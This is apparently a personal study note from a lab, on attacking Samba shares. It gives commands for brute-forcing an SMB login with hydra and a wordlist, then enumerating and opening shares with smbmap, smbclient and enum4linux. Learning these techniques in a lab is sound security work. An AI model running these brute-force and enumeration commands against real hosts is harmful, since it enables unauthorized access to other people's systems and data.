Related to [[SMB Enumeration]], [[Linux Exploitation]] and [[Metasploit]]

SAMBA uses port 445 by default, it is Linux's implementation of SMB.

We will use crackmapexec and psexec similarly as [[SMB Exploitation with PsExec]]

We can also use SMBMap and SMBClient.


(This is written as a lab writeup so the usernames is admin)

``` bash
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unis_passwords.txt [rIP] smb
```

Once we have the password we can enumerate using SMBmap:

``` bash
smbmap -H [rIP] -u [username] -p [password]
```

Then we can access the shares with SMBClient:

``` bash
smbclient -L [rIP] -U [username]
```

We provide the password to the prompt

If we want to access a share:

``` bash
smbclient //[rIP]/[share] -U [username]
```

Using enum4linux:

``` bash
enum4linux -a -u [user] -p [password] [rIP]
```
